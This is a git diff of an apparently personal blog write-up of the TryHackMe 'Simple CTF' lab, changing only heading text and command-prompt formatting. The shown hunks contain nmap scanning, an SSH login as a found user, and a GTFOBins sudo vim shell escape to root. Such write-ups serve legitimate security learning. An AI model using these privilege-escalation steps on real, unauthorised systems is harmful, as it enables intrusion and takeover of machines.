@@ -7,13 +7,13 @@ description: TryHackMe SimpleCTF CTF Write-Up
 ---
 
 # SIMPLE CTF 
--TryHackMe WRITE-UP-
+-TRYHACKME CTF WRITEUP-
 
 
 Let's start by running a Nmap scan to enumerate all open ports with the -p- argument
 
 {% highlight bash %}
-:$ Nmap -p- <target_ip>
+$ Nmap -p- <target_ip>
 {% endhighlight bash %}
 
 
@@ -164,7 +164,7 @@ Remember that ssh is being run on port 2222 (not port 22)
 Logging into an ssh session as mitch on port 2222
 We can see that the credentials are accepted
 {% highlight bash %}
-:$ ssh mitch@<ip> -p 2222
+$ ssh mitch@<ip> -p 2222
 {% endhighlight bash %}
 
 
@@ -203,7 +203,7 @@ We now need to escalate our privilege in order to gain to root flag
 Lets look for ways to get root
 Running:
 {% highlight bash %}
-:$ sudo -l
+$ sudo -l
 {% endhighlight bash %}
 We see that VIM commands are allowed to be run as sudo
 
@@ -213,7 +213,7 @@ Searching [FTGObins](https://gtfobins.github.io/) shows that we can use VIM to e
 
 Running the commnd:
 {% highlight bash %}
-:$ sudo vim -c ':!/bin/sh'
+$ sudo vim -c ':!/bin/sh'
 {% endhighlight bash %}
 We can see this command was accepted and we are now the root user
 
